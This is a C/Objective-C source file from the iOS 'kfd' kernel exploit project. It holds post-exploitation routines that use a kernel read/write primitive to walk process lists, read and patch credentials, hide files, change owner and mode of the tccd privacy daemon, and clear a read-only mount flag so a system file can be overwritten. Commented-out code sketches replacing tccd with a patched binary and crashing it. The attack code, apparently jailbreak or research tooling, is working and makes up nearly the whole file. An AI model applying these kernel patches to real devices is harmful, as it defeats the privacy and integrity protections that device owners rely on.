//
//  fun.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/25.
//

//#include "fun.h"
#include "krw.h"
#include "offsets.h"
#include <sys/stat.h>
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <sys/mount.h>
#include <sys/stat.h>
#include <sys/attr.h>
#include <sys/snapshot.h>
#include <sys/mman.h>
#include <mach/mach.h>


uint64_t getProc(uint64_t kfd, pid_t pid) {
    uint64_t proc = get_kernproc(kfd);
    
    while (true) {
        if(kread32(kfd, proc + off_p_pid) == pid) {
            return proc;
        }
        proc = kread64(kfd, proc + off_p_list_le_prev);
    }
    
    return 0;
}

uint64_t getProcByName(uint64_t kfd, char* nm) {
    uint64_t proc = get_kernproc(kfd);
    
    while (true) {
        uint64_t nameptr = proc + off_p_name;
        char name[32];
        do_kread(kfd, nameptr, &name, 32);
//        printf("[i] pid: %d, process name: %s\n", kread32(kfd, proc + off_p_pid), name);
        if(strcmp(name, nm) == 0) {
            return proc;
        }
        proc = kread64(kfd, proc + off_p_list_le_prev);
    }
    
    return 0;
}

int getPidByName(uint64_t kfd, char* nm) {
    return kread32(kfd, getProcByName(kfd, nm) + off_p_pid);
}

int funProc(uint64_t kfd, uint64_t proc) {
    int p_ppid = kread32(kfd, proc + off_p_ppid);
    printf("[i] self proc->p_ppid: %d\n", p_ppid);
    printf("[i] Patching proc->p_ppid %d -> 1 (for testing kwrite32, getppid)\n", p_ppid);
    kwrite32(kfd, proc + off_p_ppid, 0x1);
    printf("[+] Patched getppid(): %u\n", getppid());
    kwrite32(kfd, proc + off_p_ppid, p_ppid);
    printf("[+] Restored getppid(): %u\n", getppid());

    int p_original_ppid = kread32(kfd, proc + off_p_original_ppid);
    printf("[i] self proc->p_original_ppid: %d\n", p_original_ppid);
    
    int p_pgrpid = kread32(kfd, proc + off_p_pgrpid);
    printf("[i] self proc->p_pgrpid: %d\n", p_pgrpid);
    
    int p_uid = kread32(kfd, proc + off_p_uid);
    printf("[i] self proc->p_uid: %d\n", p_uid);
    
    int p_gid = kread32(kfd, proc + off_p_gid);
    printf("[i] self proc->p_gid: %d\n", p_gid);
    
    int p_ruid = kread32(kfd, proc + off_p_ruid);
    printf("[i] self proc->p_ruid: %d\n", p_ruid);
    
    int p_rgid = kread32(kfd, proc + off_p_rgid);
    printf("[i] self proc->p_rgid: %d\n", p_rgid);
    
    int p_svuid = kread32(kfd, proc + off_p_svuid);
    printf("[i] self proc->p_svuid: %d\n", p_svuid);
    
    int p_svgid = kread32(kfd, proc + off_p_svgid);
    printf("[i] self proc->p_svgid: %d\n", p_svgid);
    
    int p_sessionid = kread32(kfd, proc + off_p_sessionid);
    printf("[i] self proc->p_sessionid: %d\n", p_sessionid);
    
    uint64_t p_puniqueid = kread64(kfd, proc + off_p_puniqueid);
    printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
    
    printf("[i] Patching proc->p_puniqueid 0x%llx -> 0x4142434445464748 (for testing kwrite64)\n", p_puniqueid);
    kwrite64(kfd, proc + off_p_puniqueid, 0x4142434445464748);
    printf("[+] Patched self proc->p_puniqueid: 0x%llx\n", kread64(kfd, proc + off_p_puniqueid));
    kwrite64(kfd, proc + off_p_puniqueid, p_puniqueid);
    printf("[+] Restored self proc->p_puniqueid: 0x%llx\n", kread64(kfd, proc + off_p_puniqueid));
    
    return 0;
}

int funUcred(uint64_t kfd, uint64_t proc) {
    uint64_t proc_ro = kread64(kfd, proc + off_p_proc_ro);
    uint64_t ucreds = kread64(kfd, proc_ro + off_p_ro_p_ucred);
    
    uint64_t cr_label_pac = kread64(kfd, ucreds + off_u_cr_label);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
//
//    printf("[i] self ucred->cr_label+0x8+0x0: 0x%llx\n", kread64(kfd, kread64(kfd, cr_label+0x8)));
//    printf("[i] self ucred->cr_label+0x8+0x0+0x0: 0x%llx\n", kread64(kfd, kread64(kfd, kread64(kfd, cr_label+0x8))));
//    printf("[i] self ucred->cr_label+0x10: 0x%llx\n", kread64(kfd, cr_label+0x10));
//    uint64_t OSEntitlements = kread64(kfd, cr_label+0x10);
//    printf("OSEntitlements: 0x%llx\n", OSEntitlements);
//    uint64_t CEQueryContext = OSEntitlements + 0x28;
//    uint64_t der_start = kread64(kfd, CEQueryContext + 0x20);
//    uint64_t der_end = kread64(kfd, CEQueryContext + 0x28);
//    for(int i = 0; i < 100; i++) {
//        printf("OSEntitlements+0x%x: 0x%llx\n", i*8, kread64(kfd, OSEntitlements + i * 8));
//    }
//    kwrite64(kfd, kread64(kfd, OSEntitlements), 0);
//    kwrite64(kfd, kread64(kfd, OSEntitlements + 8), 0);
//    kwrite64(kfd, kread64(kfd, OSEntitlements + 0x10), 0);
//    kwrite64(kfd, kread64(kfd, OSEntitlements + 0x20), 0);
    
    uint64_t cr_posix_p = ucreds + off_u_cr_posix;
    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + off_cr_uid));
    printf("[i] self ucred->posix_cred->cr_ruid: %u\n", kread32(kfd, cr_posix_p + off_cr_ruid));
    printf("[i] self ucred->posix_cred->cr_svuid: %u\n", kread32(kfd, cr_posix_p + off_cr_svuid));
    printf("[i] self ucred->posix_cred->cr_ngroups: %u\n", kread32(kfd, cr_posix_p + off_cr_ngroups));
    printf("[i] self ucred->posix_cred->cr_groups: %u\n", kread32(kfd, cr_posix_p + off_cr_groups));
    printf("[i] self ucred->posix_cred->cr_rgid: %u\n", kread32(kfd, cr_posix_p + off_cr_rgid));
    printf("[i] self ucred->posix_cred->cr_svgid: %u\n", kread32(kfd, cr_posix_p + off_cr_svgid));
    printf("[i] self ucred->posix_cred->cr_gmuid: %u\n", kread32(kfd, cr_posix_p + off_cr_gmuid));
    printf("[i] self ucred->posix_cred->cr_flags: %u\n", kread32(kfd, cr_posix_p + off_cr_flags));

    return 0;
}

uint64_t getVnodeAtPath(uint64_t kfd, char* filename) {
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());

    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    
    printf("[i] %s vnode: 0x%llx\n", filename, vnode);
    close(file_index);
    
    return vnode;
}

uint64_t funVnodeHide(uint64_t kfd, char* filename) {
    uint64_t vnode = getVnodeAtPath(kfd, filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, filename: %s", filename);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(kfd, vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(kfd, vnode + off_vnode_v_iocount);
    printf("[i] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
    kwrite32(kfd, vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(kfd, vnode + off_vnode_v_iocount, iocount + 1);
    
#define VISSHADOW 0x008000
    //hide file
    uint32_t v_flags = kread32(kfd, vnode + off_vnode_v_flag);
    printf("[i] vnode->v_flags: 0x%x\n", v_flags);
    kwrite32(kfd, vnode + off_vnode_v_flag, (v_flags | VISSHADOW));

    //exist test (should not be exist
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    //show file
    v_flags = kread32(kfd, vnode + off_vnode_v_flag);
    kwrite32(kfd, vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    //restore vnode iocount, usecount
    usecount = kread32(kfd, vnode + off_vnode_v_usecount);
    iocount = kread32(kfd, vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(kfd, vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(kfd, vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

uint64_t funVnodeChown(uint64_t kfd, char* filename, uid_t uid, gid_t gid) {

    uint64_t vnode = getVnodeAtPath(kfd, filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, filename: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
    uint32_t v_uid = kread32(kfd, v_data + 0x80);
    uint32_t v_gid = kread32(kfd, v_data + 0x84);
    
    //vnode->v_data->uid
    printf("[i] Patching %s vnode->v_uid %d -> %d\n", filename, v_uid, uid);
    kwrite32(kfd, v_data+0x80, uid);
    //vnode->v_data->gid
    printf("[i] Patching %s vnode->v_gid %d -> %d\n", filename, v_gid, gid);
    kwrite32(kfd, v_data+0x84, gid);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[i] %s UID: %d\n", filename, file_stat.st_uid);
        printf("[i] %s GID: %d\n", filename, file_stat.st_gid);
    }
    
    return 0;
}

uint64_t funVnodeChmod(uint64_t kfd, char* filename, mode_t mode) {
    uint64_t vnode = getVnodeAtPath(kfd, filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, filename: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
    uint32_t v_mode = kread32(kfd, v_data + 0x88);
    
    printf("[i] Patching %s vnode->v_mode %o -> %o\n", filename, v_mode, mode);
    kwrite32(kfd, v_data+0x88, mode);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[i] %s mode: %o\n", filename, file_stat.st_mode);
    }
    
    return 0;
}

int funCSFlags(uint64_t kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);
    
    uint64_t proc_ro = kread64(kfd, proc + off_p_proc_ro);
    uint32_t csflags = kread32(kfd, proc_ro + off_p_ro_p_csflags);
    printf("[i] %s proc->proc_ro->p_csflags: 0x%x\n", process, csflags);
    
#define TF_PLATFORM 0x400

#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */

#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */

#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */

#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
    
//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
//    sleep(3);
//    kwrite32(kfd, proc_ro + off_p_ro_p_csflags, csflags);
    
    return 0;
}

int funTask(uint64_t kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);
    printf("[i] %s proc: 0x%llx\n", process, proc);
    uint64_t proc_ro = kread64(kfd, proc + off_p_proc_ro);
    
    uint64_t pr_proc = kread64(kfd, proc_ro + off_p_ro_pr_proc);
    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);
    
    uint64_t pr_task = kread64(kfd, proc_ro + off_p_ro_pr_task);
    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);
    
    //proc_is64bit_data+0x18: LDR             W8, [X8,#0x3D0]
    uint32_t t_flags = kread32(kfd, pr_task + off_task_t_flags);
    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
    
    
    /*
     * RO-protected flags:
     */
    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
    
    uint32_t t_flags_ro = kread64(kfd, proc_ro + off_p_ro_t_flags_ro);
    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
    
    return 0;
}

uint64_t findRootVnode(uint64_t kfd) {
    uint64_t launchd_proc = getProc(kfd, 1);
    
    uint64_t textvp_pac = kread64(kfd, launchd_proc + off_p_textvp);
    uint64_t textvp = textvp_pac | 0xffffff8000000000;
    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);

    uint64_t textvp_nameptr = kread64(kfd, textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(kfd, textvp_nameptr);
    uint64_t devvp = kread64(kfd, (kread64(kfd, textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    uint64_t nameptr = kread64(kfd, devvp + off_vnode_v_name);
    uint64_t name = kread64(kfd, nameptr);
    char* devName = &name;
    printf("[i] launchd proc->textvp->v_name: %s, v_mount->mnt_devvp->v_name: %s\n", &textvp_name, devName);
    
    uint64_t sbin_vnode = kread64(kfd, textvp + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(kfd, sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(kfd, textvp_nameptr);
    devvp = kread64(kfd, (kread64(kfd, textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    nameptr = kread64(kfd, devvp + off_vnode_v_name);
    name = kread64(kfd, nameptr);
    devName = &name;
    printf("[i] launchd proc->textvp->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
    
    uint64_t root_vnode = kread64(kfd, sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(kfd, root_vnode + off_vnode_v_name);
    textvp_name = kread64(kfd, textvp_nameptr);
    devvp = kread64(kfd, (kread64(kfd, root_vnode + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    nameptr = kread64(kfd, devvp + off_vnode_v_name);
    name = kread64(kfd, nameptr);
    devName = &name;
    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
    printf("[+] rootvnode: 0x%llx\n", root_vnode);
    
    return root_vnode;
}

uint64_t funVnodeRedirectFolder(uint64_t kfd, char* to, char* from) {
    uint64_t to_vnode = getVnodeAtPath(kfd, to);
    if(to_vnode == -1) {
        printf("[-] Unable to get vnode, filename: %s", to);
        return -1;
    }
    
    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_v_usecount);
    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
    
    uint64_t from_vnode = getVnodeAtPath(kfd, from);
    if(from_vnode == -1) {
        printf("[-] Unable to get vnode, filename: %s", from);
        return -1;
    }
    
    uint64_t from_v_data = kread64(kfd, from_vnode+ off_vnode_v_data);
    
    kwrite32(kfd, to_vnode + off_vnode_v_usecount, to_usecount + 1);
    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
    
    return 0;
}

uint64_t funVnodeOverwriteFile(uint64_t kfd, char* to) {

    int file_index = open(to, O_RDONLY);

    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
    
    uint64_t to_v_mount_pac = kread64(kfd, findRootVnode(kfd) + off_vnode_v_mount);
    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
    
    uint32_t to_m_flag = kread32(kfd, to_v_mount + off_mount_mnt_flag);
    
#define MNT_RDONLY      0x00000001      /* read only filesystem */
    kwrite32(kfd, to_v_mount + off_mount_mnt_flag, to_m_flag & ~MNT_RDONLY);
    
    kwrite32(kfd, fileglob + off_fg_flag, O_ACCMODE);
    
    printf("[i] %s to_vnode->v_writecount: %d\n", to, kread32(kfd, to_vnode + off_vnode_v_writecount));
    kwrite32(kfd, to_vnode + off_vnode_v_writecount, kread32(kfd, to_vnode + off_vnode_v_writecount)+1);
    
    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
    
    size_t data_len = strlen(data);

    off_t file_size = lseek(file_index, 0, SEEK_END);
    if (file_size == -1) {
        perror("Failed lseek.");
//        close(file);
//        return;
    }
    
    char* mapped = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, file_index, 0);
    if (mapped == MAP_FAILED) {
        perror("Failed mmap.");
//        close(file);
//        return;
    }
    
    memcpy(mapped, data, data_len);
    
    munmap(mapped, file_size);
    
    
    kwrite32(kfd, to_v_mount + off_mount_mnt_flag, to_m_flag);
    
    close(file_index);

    return 0;
}


uint64_t fun_ipc_entry_lookup(uint64_t kfd, mach_port_name_t port_name) {
    uint64_t proc = getProc(kfd, getpid());
    uint64_t proc_ro = kread64(kfd, proc + off_p_proc_ro);
    
    uint64_t pr_proc = kread64(kfd, proc_ro + off_p_ro_pr_proc);
    printf("[i] self proc->proc_ro->pr_proc: 0x%llx\n", pr_proc);
    
    uint64_t pr_task = kread64(kfd, proc_ro + off_p_ro_pr_task);
    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
    
    uint64_t itk_space_pac = kread64(kfd, pr_task + 0x300);
    uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
    printf("[i] self task->itk_space: 0x%llx\n", itk_space);
    //NEED TO FIGURE OUT SMR POINTER!!!
    
//    uint32_t table_size = kread32(kfd, itk_space + 0x14);
//    printf("[i] self task->itk_space table_size: 0x%x\n", table_size);
//    uint32_t port_index = MACH_PORT_INDEX(port_name);
//    if (port_index >= table_size) {
//        printf("[!] invalid port name: 0x%x", port_name);
//        return -1;
//    }
//
//    uint64_t is_table_pac = kread64(kfd, itk_space + 0x20);
//    uint64_t is_table = is_table_pac | 0xffffff8000000000;
//    printf("[i] self task->itk_space->is_table: 0x%llx\n", is_table);
//    printf("[i] self task->itk_space->is_table read: 0x%llx\n", kread64(kfd, is_table));
//
//    const int sizeof_ipc_entry_t = 0x18;
//    uint64_t ipc_entry = is_table + sizeof_ipc_entry_t * port_index;
//    printf("[i] self task->itk_space->is_table->ipc_entry: 0x%llx\n", ipc_entry);
//
//    uint64_t ie_object = kread64(kfd, ipc_entry + 0x0);
//    printf("[i] self task->itk_space->is_table->ipc_entry->ie_object: 0x%llx\n", ie_object);
//
//    sleep(1);
    
    
    
    return 0;
}

int do_fun(uint64_t kfd) {
    _offsets_init();
    
    uint64_t kslide = get_kslide(kfd);
    uint64_t kbase = 0xfffffff007004000 + kslide;
    printf("[i] Kernel base: 0x%llx\n", kbase);
    printf("[i] Kernel slide: 0x%llx\n", kslide);
    uint64_t kheader64 = kread64(kfd, kbase);
    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
    
    pid_t myPid = getpid();
    uint64_t selfProc = getProc(kfd, myPid);
    printf("[i] self proc: 0x%llx\n", selfProc);
    
    funUcred(kfd, selfProc);
    funProc(kfd, selfProc);
    funVnodeHide(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
    funCSFlags(kfd, "launchd");
    funTask(kfd, "kfd");
    
    //Patch
    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
    //Restore
    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
    
    
    //Patch
    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
    //Restore
    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
    
    mach_port_t host_self = mach_host_self();
    printf("[i] mach_host_self: 0x%x\n", host_self);
    fun_ipc_entry_lookup(kfd, host_self);
    
    funVnodeOverwriteFile(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
    

    
//    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
//    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
//    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
//    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
//    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/private");
//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"/var directory: %@", dirs);
    
    //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
    
    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
//    funVnodeResearch(kfd, mntPath.UTF8String, mntPath.UTF8String);
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"[i] /var/mobile dirs: %@", dirs);
    
    
    
    
//    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
    
//    symlink("/System/Library/PrivateFrameworks/TCC.framework/Support/", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/Support"].UTF8String);
//    mount("/System/Library/PrivateFrameworks/TCC.framework/Support/", mntPath, NULL, MS_BIND | MS_REC, NULL);
//    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);
    
//    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/");
    
    
//    for(NSString *dir in dirs) {
//        NSString *mydir = [mntPath stringByAppendingString:@"/"];
//        mydir = [mydir stringByAppendingString:dir];
//        int fd_open = open(mydir.UTF8String, O_RDONLY);
//        printf("open %s, ret: %d\n", mydir.UTF8String, fd_open);
//        if(fd_open != -1) {
//            NSArray* dirs2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mydir error:NULL];
//            NSLog(@"/var/%@ directory: %@", dir, dirs2);
//        }
//        close(fd_open);
//    }
//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library"].UTF8String, O_RDONLY));
//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/containers"].UTF8String, O_RDONLY));
//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library/Preferences"].UTF8String, O_RDONLY));
//    printf("open ret: %d\n", open("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches", O_RDONLY));
    
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[mntPath stringByAppendingString:@"/mobile"] error:NULL];
//    NSLog(@"/var/mobile directory: %@", dirs);
    
//    [@"Hello, this is an example file!" writeToFile:[mntPath stringByAppendingString:@"/Hello.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
//    funVnodeOverwriteFile(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
//    funVnodeOverwriteFile(kfd, AAAApath.UTF8String, BBBBpath.UTF8String);
//    funVnodeOverwriteFile(kfd, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
    
//    xpc_crasher("com.apple.tccd");
//    xpc_crasher("com.apple.tccd");
//    sleep(10);
//    funUcred(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
//    funProc(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
    
    
//    funVnodeOverwrite(kfd, AAAApath.UTF8String, AAAApath.UTF8String);
    
//    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);


//Overwrite tccd:
//    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
//    remove(copyToAppDocs.UTF8String);
//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
//    chmod(copyToAppDocs.UTF8String, 0755);
//    funVnodeOverwrite(kfd, selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
    
//    xpc_crasher("com.apple.tccd");
//    xpc_crasher("com.apple.tccd");

    
    return 0;
}
